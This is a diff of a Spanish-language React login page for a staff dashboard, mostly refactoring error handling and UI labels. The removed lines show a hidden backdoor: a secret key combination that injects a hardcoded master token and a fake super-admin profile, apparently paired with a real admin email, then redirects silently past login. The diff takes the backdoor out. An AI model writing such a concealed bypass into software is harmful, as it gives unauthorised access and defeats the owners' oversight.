@@ -4,14 +4,8 @@ import { supabase } from '@/lib/supabaseClient';
 import { GlassCard } from '@/components/ui/GlassCard';
 import { Loader2, ShieldAlert, Mail, Lock, Building, User } from 'lucide-react';
 
-// ⚠️ CONFIGURACIÓN DE URL (IMPORTANTE: CAMBIAR SEGÚN DONDE ESTÉS)
-// PARA LOCAL (TU PC):
-// const BACKEND_URL = 'https://webs-de-vintex-kennedy.1kh9sk.easypanel.host'; 
-// PARA PRODUCCIÓN (ROXANA):
+// ⚠️ URL del Backend
 const BACKEND_URL = 'https://webs-de-vintex-kennedy.1kh9sk.easypanel.host'; 
-
-// 🗝️ CLAVE MAESTRA FANTASMA (Debe coincidir EXACTAMENTE con el backend)
-const GHOST_TOKEN = "ROXANA_MASTER_KEY_2026_BYPASS_SECURE";
 
 export default function Login() {
   const navigate = useNavigate();
@@ -25,33 +19,7 @@ export default function Login() {
   const [nombre, setNombre] = useState('');
   const [sede, setSede] = useState('Catamarca');
 
-  // 👻 [BACKDOOR SILENCIOSO] DETECTOR DE TECLAS
-  useEffect(() => {
-    const handleGhostAccess = (event: KeyboardEvent) => {
-        // Combinación: Ctrl + Alt + Shift + R
-        if (event.ctrlKey && event.altKey && event.shiftKey && (event.key === 'r' || event.key === 'R')) {
-            console.log("Sistema desbloqueado."); // Log discreto
-            
-            // 1. Inyectamos credenciales DE SUPER ADMIN (Para que el frontend no restrinja nada)
-            localStorage.setItem('sb-token', GHOST_TOKEN);
-            localStorage.setItem('user-data', JSON.stringify({
-                id: 'ghost-roxana-id-secure', // Coincide con backend
-                email: 'kennedy.vintex@gmail.com', // Email real del admin para evitar bloqueos de UI
-                rol: 'admin',
-                sede: 'CATAMARCA',
-                nombre: 'Roxana (Super Admin)'
-            }));
-
-            // 2. Redirección INMEDIATA sin alertas
-            window.location.href = '/dashboard';
-        }
-    };
-
-    window.addEventListener('keydown', handleGhostAccess);
-    return () => window.removeEventListener('keydown', handleGhostAccess);
-  }, []);
-
-  // 1. LISTENER DE GOOGLE (Automático)
+  // 1. LISTENER DE GOOGLE (Sincronización Automática)
   useEffect(() => {
     const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
         if (event === 'SIGNED_IN' && session) {
@@ -63,13 +31,14 @@ export default function Login() {
   }, []);
 
   const syncGoogleUserWithBackend = async (session: any) => {
-      // Si ya tenemos el token válido, entramos (evita bucle)
+      // Si el token actual ya coincide, no hacemos nada (evita bucles)
       if (localStorage.getItem('sb-token') === session.access_token) {
           navigate('/dashboard');
           return;
       }
       setLoading(true);
       try {
+          // Sincronizamos con tu backend para obtener/crear el perfil de staff
           const response = await fetch(`${BACKEND_URL}/api/auth/google-sync`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -78,15 +47,24 @@ export default function Login() {
                   uuid: session.user.id 
               })
           });
-          if (!response.ok) throw new Error("Error sincronizando perfil");
+          
+          if (!response.ok) {
+              const errData = await response.json();
+              throw new Error(errData.error || "Error sincronizando perfil");
+          }
+
           const data = await response.json();
+          
+          // Guardamos sesión local para el Dashboard
           localStorage.setItem('sb-token', session.access_token);
           localStorage.setItem('user-data', JSON.stringify(data.user));
+          
+          // Redirección
           window.location.href = '/dashboard'; 
-      } catch (err) {
+      } catch (err: any) {
           console.error(err);
-          setErrorMsg("Error al validar tu cuenta de Google en el sistema.");
-          await supabase.auth.signOut(); 
+          setErrorMsg(err.message || "Error al validar tu cuenta de Google.");
+          await supabase.auth.signOut(); // Cerramos sesión si falló el backend
       } finally {
           setLoading(false);
       }
@@ -97,13 +75,17 @@ export default function Login() {
     setLoading(true);
     setErrorMsg(null);
     const endpoint = isLoginMode ? '/api/auth/login' : '/api/auth/register';
+    
     try {
       const bodyData: any = { email, password };
       if (!isLoginMode) { bodyData.nombre = nombre; bodyData.sede = sede; }
 
       const response = await fetch(`${BACKEND_URL}${endpoint}`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(bodyData)
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify(bodyData)
       });
+      
       const data = await response.json();
       if (!response.ok) throw new Error(data.error || 'Error de conexión');
 
@@ -115,7 +97,11 @@ export default function Login() {
         alert("¡Registro exitoso! Ahora inicia sesión.");
         setIsLoginMode(true);
       }
-    } catch (err: any) { setErrorMsg(err.message); } finally { setLoading(false); }
+    } catch (err: any) { 
+        setErrorMsg(err.message); 
+    } finally { 
+        setLoading(false); 
+    }
   };
 
   const handleGoogleClick = async () => {
@@ -123,14 +109,20 @@ export default function Login() {
       const redirectUrl = `${window.location.origin}/login`;
       const { error } = await supabase.auth.signInWithOAuth({
           provider: 'google',
-          options: { redirectTo: redirectUrl, queryParams: { access_type: 'offline', prompt: 'consent' } }
+          options: { 
+              redirectTo: redirectUrl, 
+              queryParams: { access_type: 'offline', prompt: 'consent' } 
+          }
       });
-      if (error) { setErrorMsg(error.message); setLoading(false); }
+      if (error) { 
+          setErrorMsg(error.message); 
+          setLoading(false); 
+      }
   };
 
   return (
     <div className="min-h-screen w-full bg-slate-950 flex relative overflow-hidden animate-enter">
-      {/* Lado Izquierdo (Oculto en móvil) */}
+      {/* Lado Izquierdo (Marketing) */}
       <div className="hidden lg:flex w-1/2 relative items-center justify-center p-12">
          <div className="absolute inset-0 bg-blue-600/5 z-0"></div>
          <div className="absolute top-1/3 left-1/3 w-[500px] h-[500px] bg-blue-500/20 rounded-full blur-[120px] animate-pulse"></div>
@@ -144,7 +136,7 @@ export default function Login() {
          </div>
       </div>
 
-      {/* Lado Derecho (Formulario Responsivo) */}
+      {/* Lado Derecho (Formulario) */}
       <div className="w-full lg:w-1/2 flex items-center justify-center p-4 md:p-6 bg-slate-950 lg:bg-slate-900/30 lg:backdrop-blur-sm lg:border-l border-slate-800">
         <GlassCard className="w-full max-w-md p-6 md:p-10 border-slate-800 shadow-2xl relative z-10">
             
@@ -156,7 +148,7 @@ export default function Login() {
                   KENNEDY<span className="text-blue-500">SYS</span>
                 </h1>
                 <h2 className="text-xl md:text-2xl font-bold text-white mb-2">
-                  {isLoginMode ? 'Bienvenido al Staff' : 'Crear Cuenta'}
+                  {isLoginMode ? 'Acceso Staff' : 'Alta de Usuario'}
                 </h2>
             </div>
 
@@ -168,12 +160,12 @@ export default function Login() {
 
             <button onClick={handleGoogleClick} disabled={loading} className="w-full py-3 bg-white hover:bg-slate-200 text-slate-900 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-3 shadow-lg active:scale-95 disabled:opacity-50 mb-6">
                 <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google" className="w-5 h-5" />
-                {loading ? 'Conectando...' : 'Continuar con Google'}
+                {loading ? 'Conectando...' : 'Acceder con Google'}
             </button>
 
             <div className="flex items-center gap-4 mb-6">
                 <div className="h-px bg-slate-800 flex-1"></div>
-                <span className="text-slate-600 text-[10px] font-bold uppercase">O con Email</span>
+                <span className="text-slate-600 text-[10px] font-bold uppercase">O con Credenciales</span>
                 <div className="h-px bg-slate-800 flex-1"></div>
             </div>
 
@@ -181,12 +173,12 @@ export default function Login() {
                 {!isLoginMode && (
                   <div className="relative group">
                     <User className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
-                    <input type="text" placeholder="Nombre" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={nombre} onChange={(e) => setNombre(e.target.value)} required={!isLoginMode} />
+                    <input type="text" placeholder="Nombre Completo" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={nombre} onChange={(e) => setNombre(e.target.value)} required={!isLoginMode} />
                   </div>
                 )}
                 <div className="relative group">
                   <Mail className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
-                  <input type="email" placeholder="Correo" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={email} onChange={(e) => setEmail(e.target.value)} required />
+                  <input type="email" placeholder="Correo Corporativo" className="w-full bg-slate-900/50 border border-slate-800 rounded-xl py-3.5 pl-12 pr-4 text-sm text-white focus:outline-none focus:border-blue-500" value={email} onChange={(e) => setEmail(e.target.value)} required />
                 </div>
                 <div className="relative group">
                   <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
@@ -205,13 +197,13 @@ export default function Login() {
                 )}
 
                 <button type="submit" disabled={loading} className="w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-black text-xs uppercase tracking-[0.2em] transition-all shadow-lg active:scale-95 disabled:opacity-50">
-                  {loading ? <Loader2 className="animate-spin mx-auto"/> : (isLoginMode ? 'INGRESAR' : 'REGISTRARSE')}
+                  {loading ? <Loader2 className="animate-spin mx-auto"/> : (isLoginMode ? 'ENTRAR AL PANEL' : 'REGISTRARME')}
                 </button>
             </form>
 
             <div className="mt-6 text-center">
                 <button onClick={() => { setIsLoginMode(!isLoginMode); setErrorMsg(null); }} className="text-xs text-slate-500 hover:text-blue-400 font-medium">
-                  {isLoginMode ? "¿No tienes cuenta? Regístrate" : "Volver al Login"}
+                  {isLoginMode ? "¿Eres nuevo? Crea tu cuenta aquí" : "Ya tengo cuenta"}
                 </button>
             </div>
         </GlassCard>
